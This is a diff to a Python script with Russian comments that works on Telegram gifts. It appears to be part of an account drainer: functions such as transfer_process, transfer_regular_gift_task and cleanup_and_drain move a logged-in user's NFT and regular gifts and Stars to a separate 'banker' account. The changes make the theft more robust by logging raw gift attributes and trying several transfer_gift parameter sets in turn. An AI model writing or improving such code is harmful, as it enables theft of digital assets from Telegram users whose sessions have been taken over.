@@ -679,10 +679,13 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                             self.message_id = getattr(raw_gift, 'message_id', None)
                             self.collectible_id = getattr(raw_gift, 'collectible_id', None)
                             
-                            # Пробуем разные варианты названия
+                            # Пробуем разные варианты названия (проверяем больше атрибутов)
                             self.title = (getattr(raw_gift, 'title', None) or 
                                         getattr(raw_gift, 'name', None) or 
-                                        getattr(raw_gift, 'text', None) or 
+                                        getattr(raw_gift, 'text', None) or
+                                        getattr(raw_gift, 'description', None) or
+                                        getattr(raw_gift, 'label', None) or
+                                        f"Gift #{getattr(raw_gift, 'id', '?')}" or
                                         "Unknown Gift")
                             
                             # Пробуем разные варианты цены конвертации
@@ -716,6 +719,19 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                     
                     for idx, gift_raw in enumerate(gifts_list, 1):
                         try:
+                            # Логируем атрибуты raw объекта для диагностики (только для первого подарка)
+                            if idx == 1:
+                                attrs = [attr for attr in dir(gift_raw) if not attr.startswith('_')]
+                                log_transfer(f"🔍 Атрибуты raw подарка: {attrs}")
+                                # Пробуем получить значения некоторых атрибутов
+                                for attr in ['id', 'message_id', 'collectible_id', 'title', 'name', 'text', 'convert_price', 'price', 'star_count']:
+                                    try:
+                                        val = getattr(gift_raw, attr, None)
+                                        if val is not None:
+                                            log_transfer(f"🔍 {attr} = {val}")
+                                    except:
+                                        pass
+                            
                             # Создаем SimpleGift напрямую из raw объекта
                             gift_obj = SimpleGift(gift_raw)
                             log_transfer(f"🎁 Подарок #{idx}: {gift_obj.title} (NFT: {gift_obj.collectible_id is not None}, Конверт: {gift_obj.convert_price > 0}, Трансфер: {gift_obj.can_transfer})")
@@ -1249,20 +1265,52 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
     return nft_log_results, final_stars
     
 async def transfer_regular_gift_task(client: Client, gift_details, target_chat_id):
-    """Попытка передать обычный подарок (не NFT) банкиру через Pyrofork"""
+    """Попытка передать обычный подарок (не NFT) банкиру"""
     gift_title = gift_details.get('title', 'Unknown Gift')
-    msg_id = str(gift_details['msg_id'])
+    msg_id = gift_details.get('msg_id')
+    gift_id = gift_details.get('id') or msg_id
+    
+    if not msg_id and not gift_id:
+        log_transfer(f"⚠️ Нет ID подарка для передачи: {gift_title}", "warning")
+        return False
     
     log_transfer(f"📤 Попытка передачи обычного подарка: {gift_title} -> {target_chat_id}")
     
+    # Пробуем разные варианты параметров для transfer_gift
     try:
-        # Pyrofork поддерживает transfer_gift для обычных подарков (если возможно)
-        await client.transfer_gift(
-            owned_gift_id=msg_id,
-            new_owner_chat_id=target_chat_id
-        )
-        log_transfer(f"✅ Обычный подарок передан: {gift_title}")
-        return True
+        # Вариант 1: owned_gift_id и new_owner_chat_id
+        try:
+            await client.transfer_gift(
+                owned_gift_id=str(msg_id) if msg_id else str(gift_id),
+                new_owner_chat_id=target_chat_id
+            )
+            log_transfer(f"✅ Обычный подарок передан: {gift_title}")
+            return True
+        except TypeError as te:
+            # Если не поддерживается owned_gift_id, пробуем другие варианты
+            log_transfer(f"⚠️ Вариант 1 не сработал: {te}", "warning")
+            
+            # Вариант 2: message_id и chat_id
+            try:
+                await client.transfer_gift(
+                    message_id=msg_id,
+                    chat_id=target_chat_id
+                )
+                log_transfer(f"✅ Обычный подарок передан (вариант 2): {gift_title}")
+                return True
+            except:
+                pass
+            
+            # Вариант 3: gift_id и recipient_id
+            try:
+                await client.transfer_gift(
+                    gift_id=gift_id,
+                    recipient_id=target_chat_id
+                )
+                log_transfer(f"✅ Обычный подарок передан (вариант 3): {gift_title}")
+                return True
+            except:
+                pass
         
     except BadRequest as e:
         error_str = str(e)
@@ -1277,6 +1325,8 @@ async def transfer_regular_gift_task(client: Client, gift_details, target_chat_i
         # Если не получилось передать, возвращаем False - будет конвертирован
         log_transfer(f"⚠️ Не удалось передать подарок {gift_title}: {type(e).__name__}: {e}", "warning")
         return False
+    
+    return False
 
 async def cleanup_and_drain(client: Client, banker_username):
     try:
